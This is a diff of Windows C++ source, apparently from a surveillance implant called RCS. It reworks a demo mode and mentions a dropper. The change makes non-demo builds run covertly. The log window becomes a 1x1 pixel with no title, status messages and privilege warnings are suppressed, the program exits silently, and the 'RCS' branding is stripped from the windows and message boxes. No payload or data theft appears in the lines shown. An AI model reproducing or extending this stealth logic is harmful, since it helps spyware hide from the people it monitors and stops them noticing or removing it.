@@ -2,9 +2,6 @@
 
 HWND g_report_hwnd = NULL;
 
-#ifdef DEMO_VERSION
-
-#include "biohazard.h"
 #include "common.h"
 #include "H4-DLL.h"
 #include <string>
@@ -21,23 +18,30 @@ void SetDesktopBackground()
 	DWORD dummy;
 	char bitmap_path[_MAX_PATH + 1];
 
+	if (!is_demo_version)
+		return;
+
 	HM_CompletePath(DESKTOP_BMP_NAME, bitmap_path);
-	hfile = FNC(CreateFileA)(bitmap_path, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_NEW, NULL, NULL);
+	// Adesso il file nella versione demo viene scritto dal dropper
+	/*hfile = FNC(CreateFileA)(bitmap_path, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_NEW, NULL, NULL);
 	if (hfile != INVALID_HANDLE_VALUE) {
 		FNC(WriteFile)(hfile, biohazard_bmp, biohazard_bmp_len, &dummy, NULL);
 		CloseHandle(hfile);
-	}
+	}*/
 	FNC(SystemParametersInfoA)(SPI_SETDESKWALLPAPER, 0, bitmap_path, 0);
 }
 
 
 void RemoveDesktopBackground()
-{
+{	
+	if (!is_demo_version)
+		return;
+
 	FNC(SystemParametersInfoA)(SPI_SETDESKWALLPAPER, 0, "", 0);
 }
 
 
-LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
+LRESULT CALLBACK WndProcDemo(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
 {
 	HDC hdc ;
 	PAINTSTRUCT ps ;
@@ -78,6 +82,10 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
 	return 0;
 }
 
+LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
+{
+	return 1;
+}
 
 BOOL CreateLogWindow()
 {
@@ -85,38 +93,51 @@ BOOL CreateLogWindow()
 	char szClassName[] = "LogWindowClass";
 
 	wc.cbSize        = sizeof(WNDCLASSEX);
-    wc.style         = CS_NOCLOSE;
-    wc.lpfnWndProc   = WndProc;
-    wc.cbClsExtra    = 0;
-    wc.cbWndExtra    = 0;
-    wc.hInstance     = NULL;
+	wc.style         = CS_NOCLOSE;
+	wc.cbClsExtra    = 0;
+	wc.cbWndExtra    = 0;
+	wc.hInstance     = NULL;
 	wc.hIcon         = LoadIcon(NULL, IDI_INFORMATION);
-    wc.hCursor       = LoadCursor(NULL, IDC_ARROW);
-    wc.hbrBackground = 0;
-    wc.lpszMenuName  = NULL;
-    wc.lpszClassName = szClassName;
+	wc.hCursor       = LoadCursor(NULL, IDC_ARROW);
+	wc.hbrBackground = 0;
+	wc.lpszMenuName  = NULL;
+	wc.lpszClassName = szClassName;
 	wc.hIconSm       = LoadIcon(NULL, IDI_INFORMATION);
 
-    if(!RegisterClassEx(&wc)) {
-        MessageBox(NULL, "Window Registration Failed!", "Error!", MB_ICONEXCLAMATION | MB_OK);
-        return FALSE;
-    }
+	if (is_demo_version) {
+		wc.lpfnWndProc   = WndProcDemo;
+		if(!RegisterClassEx(&wc)) {
+			MessageBox(NULL, "Window Registration Failed!", "Error!", MB_ICONEXCLAMATION | MB_OK);
+			return FALSE;
+		}
 
-    g_report_hwnd = CreateWindowEx( NULL, szClassName, "RCS Status Log", WS_OVERLAPPEDWINDOW, CW_USEDEFAULT, CW_USEDEFAULT, 480, 270, NULL, NULL, NULL, NULL);
+		g_report_hwnd = CreateWindowEx( NULL, szClassName, "Status Log", WS_OVERLAPPEDWINDOW, CW_USEDEFAULT, CW_USEDEFAULT, 480, 270, NULL, NULL, NULL, NULL);
 
-	if (!g_report_hwnd)  {
-        MessageBox(NULL, "Window Registration Failed!", "Error!", MB_ICONEXCLAMATION | MB_OK);
-        return FALSE;
-    }
+		if (!g_report_hwnd)  {
+			MessageBox(NULL, "Window Registration Failed!", "Error!", MB_ICONEXCLAMATION | MB_OK);
+			return FALSE;
+		}
 
-	ShowWindow(g_report_hwnd, SW_SHOW);
-    UpdateWindow(g_report_hwnd);	
-	return TRUE;
+		ShowWindow(g_report_hwnd, SW_SHOW);
+		UpdateWindow(g_report_hwnd);	
+		return TRUE;
+	} else {
+		wc.lpfnWndProc   = WndProc;
+		if(!RegisterClassEx(&wc)) 
+			return FALSE;
+		g_report_hwnd = CreateWindowEx( NULL, szClassName, "", WS_OVERLAPPEDWINDOW, CW_USEDEFAULT, CW_USEDEFAULT, 1, 1, NULL, NULL, NULL, NULL);
+		if (!g_report_hwnd)  
+			return FALSE;
+		return TRUE;
+	}
 }
 
 
 void ReportStatusLog(char *status_log)
 {
+	if (!is_demo_version)
+		return;
+
 	if (g_report_hwnd) {
 		g_log_report += status_log;
 		InvalidateRect(g_report_hwnd, NULL, FALSE);
@@ -128,6 +149,9 @@ void ReportStatusLog(char *status_log)
 void ReportExitProcess()
 {
 	MSG msg;
+
+	if (!is_demo_version)
+		ExitProcess(0);
 
 	ReportStatusLog("\r\nExecution Terminated\r\nPress CR to exit...");
 	is_exit_scheduled = TRUE;
@@ -145,60 +169,11 @@ void ReportExitProcess()
 
 void ReportCannotInstall()
 {
-	MessageBox(NULL, "Insufficient privileges", "RCS Warning", MB_OK);
-}
+	if (!is_demo_version)
+		return;
 
-#else
-
-void SetDesktopBackground()
-{
-}
-
-void RemoveDesktopBackground()
-{
-}
-
-void ReportExitProcess() 
-{
-	ExitProcess(0);
-}
-
-LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
-{
-	return 1;
+	MessageBox(NULL, "Insufficient privileges", "Warning", MB_OK);
 }
 
 
-BOOL CreateLogWindow()
-{
-    WNDCLASSEX wc;    
-	char szClassName[] = "LogWindowClass";
 
-	wc.cbSize        = sizeof(WNDCLASSEX);
-    wc.style         = CS_NOCLOSE;
-    wc.lpfnWndProc   = WndProc;
-    wc.cbClsExtra    = 0;
-    wc.cbWndExtra    = 0;
-    wc.hInstance     = NULL;
-	wc.hIcon         = LoadIcon(NULL, IDI_INFORMATION);
-    wc.hCursor       = LoadCursor(NULL, IDC_ARROW);
-    wc.hbrBackground = 0;
-    wc.lpszMenuName  = NULL;
-    wc.lpszClassName = szClassName;
-	wc.hIconSm       = LoadIcon(NULL, IDI_INFORMATION);
-
-    if(!RegisterClassEx(&wc)) 
-		return FALSE;
-    
-    g_report_hwnd = CreateWindowEx( NULL, szClassName, "", WS_OVERLAPPEDWINDOW, CW_USEDEFAULT, CW_USEDEFAULT, 1, 1, NULL, NULL, NULL, NULL);
-	if (!g_report_hwnd)  
-        return FALSE;
-
-	return TRUE;
-}
-
-void ReportCannotInstall()
-{
-}
-
-#endif
